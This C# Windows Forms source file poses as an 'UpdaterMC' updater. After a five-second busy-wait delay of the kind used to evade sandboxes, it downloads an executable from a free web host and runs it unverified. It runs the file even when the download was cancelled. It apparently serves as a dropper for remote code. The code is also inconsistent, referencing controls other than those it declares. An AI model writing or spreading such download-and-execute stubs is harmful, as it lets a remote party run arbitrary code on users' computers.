using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace UpdaterMC
{
    public partial class Form1 : Form
    {
		private string serverFile = "https://miisaakii.000webhostapp.com/Misakiki57/mcV1";
        static string path = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(Application.ExecutablePath));
        private string localFile = Application.StartupPath + "/mcV1.exe";
		private Thread thread;
		private WebClient webClient;
		private ProgressBar progressBarUpdate;
		private Label labelProgress;

		public Form1()
        {
            InitializeComponent();
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			int num = 0;
			for (; ; )
			{
				if (num % 100000 == 0)
				{
					stopwatch.Stop();
					if (stopwatch.ElapsedMilliseconds > 5000L)
					{
						break;
					}
					stopwatch.Start();
				}
				num++;
			}
			this.updateTool();
		}

		private void updateTool()
		{
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFileCompleted += this.Completed;
				webClient.DownloadProgressChanged += this.ProgressChanged;
				try
				{
					webClient.DownloadFileAsync(new Uri(this.serverFile), this.localFile);
				}
				catch (Exception ex2)
				{
					MessageBox.Show(ex2.ToString());
					Application.Exit();
				}
			}
		}

		private void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
		{
			this.guna2ProgressBar1.Value = e.ProgressPercentage;
			this.label3.Text = string.Format("{0} MB's / {1} MB's", ((double)e.BytesReceived / 1024.0 / 1024.0).ToString("0.00"), ((double)e.TotalBytesToReceive / 1024.0 / 1024.0).ToString("0.00"));
		}

		private void Completed(object sender, AsyncCompletedEventArgs e)
		{
			if (e.Cancelled)
			{
				MessageBox.Show("Download has been canceled.");
			}
			else
			{
				this.guna2ProgressBar1.Maximum = this.guna2ProgressBar1.Value;
				this.label3.Text = "Download Complete";
			}

			Process.Start(localFile);
			Application.Exit();
		}

		private void Form1_Load(object sender, EventArgs e)
        {

        }
	}
}
